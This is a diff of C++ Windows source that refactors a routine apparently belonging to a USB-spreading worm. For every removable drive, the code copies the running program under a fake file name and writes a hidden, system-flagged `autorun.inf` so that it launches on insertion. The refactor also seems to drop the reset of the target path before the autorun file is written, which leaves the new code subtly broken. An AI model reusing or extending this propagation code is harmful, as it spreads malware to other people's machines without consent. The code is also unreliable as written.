@@ -53,41 +53,45 @@ bool Installer::SetAutorun(bool autorun)
 bool Installer::InstallOnDrives()
 {
 	TCHAR drive[_MAX_PATH] = _T(" :\\");
-	TCHAR target[_MAX_PATH];
 
 	for (TCHAR c = 'A'; c <= 'Z'; c++) {
 		drive[0] = c;
 
-		if (GetDriveType(drive) != DRIVE_REMOVABLE) {
-			continue;
-		}
-
-		target[0] = '\0';
-		if (!(PathAppend(target, drive) && PathAppend(target, V_FAKE_USB_FILE))) {
-			continue;
-		}
-
-		if (!this->CopyTo(target)) {
-			continue;
-		}
-
-		target[0] = '\0';
-		if (!(PathAppend(target, drive) && PathAppend(target, _T("autorun.inf")))) {
-			continue;
-		}
-
-		HANDLE hFile = CreateFile(target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
-			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
-		if (hFile == INVALID_HANDLE_VALUE) {
-			continue;
-		}
-
-		DWORD written;
-		WriteFile(hFile, autorunData, autorunBytes, &written, NULL);
-
-		CloseHandle(hFile);
+		this->InstallOnDrive(drive);
 	}
 	return true;
+}
+bool Installer::InstallOnDrive(const TCHAR* drive)
+{
+	TCHAR target[_MAX_PATH] = {0};
+
+	if (GetDriveType(drive) != DRIVE_REMOVABLE) {
+		return false;
+	}
+
+	if (!(PathAppend(target, drive) && PathAppend(target, V_FAKE_USB_FILE))) {
+		return false;
+	}
+
+	if (!this->CopyTo(target)) {
+		return false;
+	}
+
+	if (!(PathAppend(target, drive) && PathAppend(target, _T("autorun.inf")))) {
+		return false;
+	}
+
+	HANDLE hFile = CreateFile(target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		return false;
+	}
+
+	DWORD written;
+	bool ret = TRUE == WriteFile(hFile, autorunData, autorunBytes, &written, NULL);
+
+	CloseHandle(hFile);
+	return ret;
 }
 
 bool Installer::CopyTo(const TCHAR* path)
